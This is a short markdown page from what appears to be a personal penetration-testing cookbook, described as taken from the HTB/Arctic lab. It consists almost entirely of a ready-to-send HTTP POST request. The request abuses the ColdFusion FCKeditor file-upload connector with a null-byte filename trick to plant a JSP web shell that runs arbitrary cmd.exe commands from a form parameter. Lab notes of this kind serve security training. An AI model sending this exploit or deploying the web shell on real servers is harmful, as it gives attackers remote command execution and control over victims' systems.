---
layout: default
title: Web
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## Uploading files with a POST request
This example is taken from HTB/Arctic. Use Burp Suite > Repeater and build the POST request in the window:

```jsp
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/MHEDXHF.jsp%00 HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: multipart/form-data; boundary=_Part_144_2215137543_3041307620
Connection: close

--_Part_144_2215137543_3041307620
Content-Disposition: form-data; name="newfile"; filename="EDZBLJVGF.txt"
Content-Type: application/x-java-archive

<FORM METHOD=GET ACTION='MHEDXHF.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>


--_Part_144_2215137543_3041307620--
```